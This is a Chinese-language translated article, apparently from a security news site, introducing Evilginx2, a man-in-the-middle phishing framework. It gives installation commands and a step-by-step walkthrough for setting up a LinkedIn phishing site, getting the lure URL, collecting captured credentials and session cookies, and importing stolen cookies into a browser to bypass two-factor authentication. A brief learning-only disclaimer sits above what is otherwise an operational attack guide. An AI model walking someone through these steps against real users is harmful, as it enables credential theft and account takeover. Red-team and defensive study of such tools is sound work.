****声明：** Evilginx仅用于学习交流目的使用，任何非法未授权的测试都将承担不可预知的法律风险！**  

## 前言

**Evilginx2是一个可窃取登陆凭证及cookie，并可绕过双因素身份验证的中间人网络钓鱼攻击框架。相较于2017年发布的[Evilginx](https://github.com/kgretzky/evilginx)，它的功能更为强大。Evilginx2使用自定义版本的Nginx
HTTP服务器来代理合法登录访问者页面，并且即时捕获凭证和会话cookie。当前版本完全使用GO语言编写，并作为一个独立的应用程序。此外，它还实现了自己的HTTP和DNS服务器，使其更易于设置和使用。**

**![screen.png](https://image.3001.net/images/20181128/1543365593_5bfde3d98419e.png!small)**

  

## **演示视频**

[1](https://vimeo.com/281220095)

## 安装

你可以根据你当前所使用的系统选择相应的预编译二进制压缩包进行安装，或是从源码编译安装。

此外，你需要有一个外部服务器，用于托管evilginx2。我个人推荐Digital
Ocean，如果你通过我的推荐链接购买，你将[获得额外10美元的优惠](https://m.do.co/c/50338abc7ffe)。

Evilginx在Debian 8 VPS上运行得非常好。

### 从源码安装

想要从源码进行编译，请确保你安装的GO版本至少为1.10.0（你可以[在此处获取](https://golang.org/doc/install)），且正确设置了$GOPATH环境变量（def.
$HOME/go）。

安装完成后，将其添加到~/.profile中，这里假设你将GO安装在了/usr/local/go目录下：

    
    
    export GOPATH=$HOME/go
    export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin

然后我们使用source ~/.profiles命令进行加载。

现在，让我们开始安装evilginx2。

    
    
    sudo apt-get install git make
    go get -u github.com/kgretzky/evilginx2
    cd $GOPATH/src/github.com/kgretzky/evilginx2
    make

你现在可以从本地目录运行evilginx2：

    
    
    sudo ./bin/evilginx -p ./phishlets/

或全局安装它：

    
    
    sudo make install
    sudo evilginx

### 使用Docker安装

你也可以在Docker中启动evilginx2。首先，让我们来构建容器：

    
    
    docker build . -t evilginx2

然后运行容器：

    
    
    docker run -it -p 53:53/udp -p 80:80 -p 443:443 evilginx2

### 从预编译二进制包安装

从[这里](https://github.com/kgretzky/evilginx2/releases)获取预编译二进制包，并解压缩进入该目录：

    
    
    unzip <package_name>.zip -d <package_name>
    cd <package_name>

如果要进行系统范围的安装，请使用root权限安装脚本：

    
    
    chmod 700 ./install.sh
    sudo ./install.sh
    sudo evilginx

或者只是从当前目录启动evilginx2（但仍需要root权限）：

    
    
    chmod 700 ./evilginx
    sudo ./evilginx

## 使用

 **注意：** 请确保当前没有服务侦听在端口 TCP 443，TCP 80 和 UDP 53
上。你可能需要关闭apache或nginx以及可能正在运行的用于解析DNS的任何服务。如果无法在任何这些端口上打开监听套接字，evilginx2会在启动时告诉你。

默认情况下，evilginx2将首先在./phishlets/目录中查找phishlets，然后是/usr/share/evilginx/phishlets/目录。如果要从指定路径中加载phishlets，请在启动工具时使用-p
<phishlets_dir_path>参数。

    
    
    Usage of ./evilginx:
      -debug
            Enable debug output
      -developer
            Enable developer mode (generates self-signed certificates for all hostnames)
      -p string
            Phishlets directory path

有关更多命令和详细信息，你可以使用help或help <command>命令查看。

## 使用入门

启动和运行前我们还需要进行一些设置。

这里我假设你已注册了一个域名（yourdomain.com），并在域名提供商的管理面板中设置了指向服务器IP的（例如10.0.0.1）名称服务器（ns1和ns2）：

    
    
    ns1.yourdomain.com = 10.0.0.1
    ns2.yourdomain.com = 10.0.0.1

使用以下命令设置服务器的域和IP：

    
    
    config domain yourdomain.com
    config ip 10.0.0.1

下面，我将以LinkedIn为例执行网络钓鱼攻击。

    
    
    phishlets hostname linkedin my.phishing.hostname.yourdomain.com

现在，你可以启用phishlet。如果你选择的主机名在本地找不到，则会自动检索LetsEncrypt SSL/TLS证书：

    
    
    phishlets enable linkedin

现在，你的钓鱼站点已上线。这里我将登录受害者重定向到了谷歌（<https://www.google.com>）上：

    
    
    phishlets get-url linkedin https://www.google.com

运行phishlets将只响应标记链接，所以任何扫描你主域的扫描器都将被重定向到config下redirect_url指定的URL。如果你希望隐藏phishlet，并且即使对有效的标记化钓鱼URL也不响应，请使用phishlet
hide/unhide <phishlet>命令。

使用以下命令监控捕获的凭据和会话cookie：

    
    
    sessions

获取有关捕获会话的详细信息（将在底部以JSON格式打印）：

    
    
    sessions <id>

你可以使用[EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en)插件，将捕获的会话Cookie复制并导入到Chrome浏览器中。

 **注意！** 如果你希望从服务器注销后继续运行evilginx2，则应在屏幕会话中运行它。

##  **相关文章**

想要了解有关此网络钓鱼技术的更多信息，请阅读我写的一篇关于evilginx2的博文：<https://breakdev.org/evilginx-2-next-generation-of-phishing-2fa-tokens>。

 **
*参考来源：[GitHub](https://github.com/kgretzky/evilginx2)，FB小编secist编译，转载请注明来自FreeBuf.COM**

